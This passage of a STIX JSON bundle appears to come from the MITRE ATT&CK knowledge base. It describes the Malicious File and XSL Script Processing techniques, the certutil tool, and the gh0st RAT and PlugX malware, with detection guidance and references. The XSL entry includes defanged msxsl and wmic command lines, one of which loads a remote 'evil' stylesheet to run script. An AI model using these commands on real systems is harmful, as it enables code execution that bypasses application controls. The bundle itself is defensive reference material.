                    "url": "https://any.run/cybersecurity-blog/time-bombs-malware-with-delayed-execution/",
                    "description": "Malicious History. (2020, September 17). Time Bombs: Malware With Delayed Execution. Retrieved April 22, 2021.",
                    "source_name": "AnyRun TimeBomb"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Malicious File",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "File: File Creation"
            ],
            "x_mitre_version": "1.1",
            "modified": "2021-07-21T23:10:47.193Z",
            "created": "2020-03-11T14:49:36.954Z",
            "x_mitre_permissions_required": [
                "User"
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
            "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) on the file to increase the likelihood that a user will open it.\n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_detection": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1204/002",
                    "external_id": "T1204.002",
                    "source_name": "mitre-attack"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "XSL Script Processing",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1220",
                    "external_id": "T1220",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "Microsoft XSLT Script Mar 2017",
                    "description": "Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using <msxsl:script>. Retrieved July 3, 2018.",
                    "url": "https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script"
                },
                {
                    "source_name": "Microsoft msxsl.exe",
                    "description": "Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018.",
                    "url": "https://www.microsoft.com/download/details.aspx?id=21714"
                },
                {
                    "source_name": "Penetration Testing Lab MSXSL July 2017",
                    "description": "netbiosX. (2017, July 6). AppLocker Bypass \u2013 MSXSL. Retrieved July 3, 2018.",
                    "url": "https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/"
                },
                {
                    "source_name": "Reaqta MSXSL Spearphishing MAR 2018",
                    "description": "Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018.",
                    "url": "https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/"
                },
                {
                    "source_name": "XSL Bypass Mar 2019",
                    "description": "Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE \u2014 A Way to Proxy Code Execution. Retrieved August 2, 2019.",
                    "url": "https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75"
                },
                {
                    "url": "https://lolbas-project.github.io/lolbas/Binaries/Wmic/",
                    "description": "LOLBAS. (n.d.). Wmic.exe. Retrieved July 31, 2019.",
                    "source_name": "LOLBAS Wmic"
                },
                {
                    "source_name": "Twitter SquiblyTwo Detection APR 2018",
                    "description": "Desimone, J. (2018, April 18). Status Update. Retrieved July 3, 2018.",
                    "url": "https://twitter.com/dez_/status/986614411711442944"
                }
            ],
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Module: Module Load"
            ],
            "x_mitre_version": "1.2",
            "modified": "2021-02-09T15:07:00.842Z",
            "x_mitre_system_requirements": [
                "Microsoft Core XML Services (MSXML) or access to wmic.exe"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3",
            "x_mitre_defense_bypassed": [
                "Anti-virus",
                "Application control",
                "Digital Certificate Validation"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:\u201dhttps[:]//example[.]com/evil[.]xsl\u201d</code>",
            "x_mitre_contributors": [
                "Avneet Singh",
                "Casey Smith",
                "Praetorian"
            ],
            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\n\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.",
            "created": "2018-10-17T00:14:20.652Z",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "tool",
            "name": "certutil",
            "x_mitre_aliases": [
                "certutil",
                "certutil.exe"
            ],
            "x_mitre_version": "1.2",
            "modified": "2021-08-16T17:50:50.307Z",
            "created": "2017-12-14T16:46:06.044Z",
            "x_mitre_platforms": [
                "Windows"
            ],
            "id": "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc",
            "description": "[certutil](https://attack.mitre.org/software/S0160) is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. (Citation: TechNet Certutil)",
            "labels": [
                "tool"
            ],
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/software/S0160",
                    "external_id": "S0160",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "TechNet Certutil",
                    "description": "Microsoft. (2012, November 14). Certutil. Retrieved July 3, 2017.",
                    "url": "https://technet.microsoft.com/library/cc732443.aspx"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "malware",
            "name": "gh0st RAT",
            "x_mitre_aliases": [
                "gh0st RAT"
            ],
            "x_mitre_version": "2.3",
            "modified": "2021-04-23T20:43:13.190Z",
            "created": "2017-05-31T21:32:24.937Z",
            "x_mitre_platforms": [
                "Windows",
                "macOS"
            ],
            "id": "malware--88c621a7-aef9-4ae0-94e3-1fc87123eb24",
            "description": "[gh0st RAT](https://attack.mitre.org/software/S0032) is a remote access tool (RAT). The source code is public and it has been used by multiple groups. (Citation: FireEye Hacking Team)(Citation: Arbor Musical Chairs Feb 2018)(Citation: Nccgroup Gh0st April 2018)",
            "labels": [
                "malware"
            ],
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/software/S0032",
                    "external_id": "S0032",
                    "source_name": "mitre-attack"
                },
                {
                    "description": "(Citation: FireEye Hacking Team)(Citation: Nccgroup Gh0st April 2018)",
                    "source_name": "gh0st RAT"
                },
                {
                    "url": "https://www.fireeye.com/blog/threat-research/2015/07/demonstrating_hustle.html",
                    "description": "FireEye Threat Intelligence. (2015, July 13). Demonstrating Hustle, Chinese APT Groups Quickly Use Zero-Day Vulnerability (CVE-2015-5119) Following Hacking Team Leak. Retrieved January 25, 2016.",
                    "source_name": "FireEye Hacking Team"
                },
                {
                    "source_name": "Arbor Musical Chairs Feb 2018",
                    "description": "Sabo, S. (2018, February 15). Musical Chairs Playing Tetris. Retrieved February 19, 2018.",
                    "url": "https://www.arbornetworks.com/blog/asert/musical-chairs-playing-tetris/"
                },
                {
                    "source_name": "Nccgroup Gh0st April 2018",
                    "description": "Pantazopoulos, N. (2018, April 17). Decoding network data from a Gh0st RAT variant. Retrieved November 2, 2018.",
                    "url": "https://research.nccgroup.com/2018/04/17/decoding-network-data-from-a-gh0st-rat-variant/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "malware",
            "name": "PlugX",
            "x_mitre_aliases": [
                "PlugX",
                "DestroyRAT",
                "Sogu",
                "Kaba",
                "Korplug"
            ],
            "x_mitre_version": "2.1",
            "modified": "2020-06-20T21:43:42.587Z",
            "created": "2017-05-31T21:32:15.638Z",
            "x_mitre_platforms": [
                "Windows"
            ],
            "id": "malware--64fa0de0-6240-41f4-8638-f4ca7ed528fd",
            "description": "[PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) that uses modular plugins. It has been used by multiple threat groups. (Citation: Lastline PlugX Analysis) (Citation: FireEye Clandestine Fox Part 2) (Citation: New DragonOK) (Citation: Dell TG-3390)",
            "labels": [
                "malware"
            ],
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/software/S0013",
                    "external_id": "S0013",
                    "source_name": "mitre-attack"
                },
                {
                    "description": "(Citation: Lastline PlugX Analysis) (Citation: FireEye Clandestine Fox Part 2)(Citation: CIRCL PlugX March 2013)",
                    "source_name": "PlugX"
                },
                {
                    "description": "(Citation: CIRCL PlugX March 2013)",
                    "source_name": "DestroyRAT"
                },
                {
                    "description": "(Citation: Lastline PlugX Analysis) (Citation: FireEye Clandestine Fox Part 2)(Citation: CIRCL PlugX March 2013)",
                    "source_name": "Sogu"
                },
                {
                    "description": "(Citation: FireEye Clandestine Fox Part 2)",
                    "source_name": "Kaba"
                },
                {
                    "description": "(Citation: Lastline PlugX Analysis)(Citation: CIRCL PlugX March 2013)",
                    "source_name": "Korplug"
                },
                {
                    "source_name": "Lastline PlugX Analysis",
                    "description": "Vasilenko, R. (2013, December 17). An Analysis of PlugX Malware. Retrieved November 24, 2015.",
                    "url": "http://labs.lastline.com/an-analysis-of-plugx"
                },
                {
                    "url": "https://www.fireeye.com/blog/threat-research/2014/06/clandestine-fox-part-deux.html",
                    "description": "Scott, M.. (2014, June 10). Clandestine Fox, Part Deux. Retrieved January 14, 2016.",
                    "source_name": "FireEye Clandestine Fox Part 2"
                },
                {
                    "url": "http://researchcenter.paloaltonetworks.com/2015/04/unit-42-identifies-new-dragonok-backdoor-malware-deployed-against-japanese-targets/",
                    "description": "Miller-Osborn, J., Grunzweig, J.. (2015, April). Unit 42 Identifies New DragonOK Backdoor Malware Deployed Against Japanese Targets. Retrieved November 4, 2015.",
                    "source_name": "New DragonOK"
                },
                {
                    "url": "https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage",
                    "description": "Dell SecureWorks Counter Threat Unit Threat Intelligence. (2015, August 5). Threat Group-3390 Targets Organizations for Cyberespionage. Retrieved August 18, 2018.",
                    "source_name": "Dell TG-3390"
                },
                {
                    "url": "http://circl.lu/assets/files/tr-12/tr-12-circl-plugx-analysis-v1.pdf",
                    "description": "Computer Incident Response Center Luxembourg. (2013, March 29). Analysis of a PlugX variant. Retrieved November 5, 2018.",
                    "source_name": "CIRCL PlugX March 2013"
                }
            ]
        }
    ]
}